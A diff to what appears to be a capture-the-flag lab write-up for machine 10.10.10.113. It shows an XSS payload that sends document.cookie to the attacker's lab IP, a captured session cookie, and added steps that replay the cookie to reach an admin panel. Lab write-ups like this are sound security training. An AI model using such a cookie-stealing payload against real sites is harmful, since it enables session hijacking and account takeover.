@@ -190,8 +190,11 @@ Machine IP: 10.10.10.113 - Debian
   - Payload - `<script>document.write('<img src="http://10.10.14.34/nothing.gif?cookie' + document.cookie + '"/>)</script>"'`.
 ![image](https://user-images.githubusercontent.com/83878909/229376092-d0719df1-6bae-45e8-b4db-d38dba64f633.png)
 ![image](https://user-images.githubusercontent.com/83878909/229376168-0d6dd946-f4d5-4141-9896-62da0d832fde.png)
-  - Session-Cookie: `9cvn6v8fh74bv8h6bql20dlt27`.
+  - Session-Cookie: `9cvn6v8fh74bv8h6bql20dlt27` and Domain is `admin`.
 ---
 
 ## Vhost Application
 ![image](https://user-images.githubusercontent.com/83878909/229376279-739ef964-6d88-4623-b437-8fbf417f2a8e.png)
+  - Replace the session-cookie.
+  - Access to `Admin Panel`.
+![image](https://user-images.githubusercontent.com/83878909/229376623-800edb13-7be8-4481-bd76-7376e723f077.png)
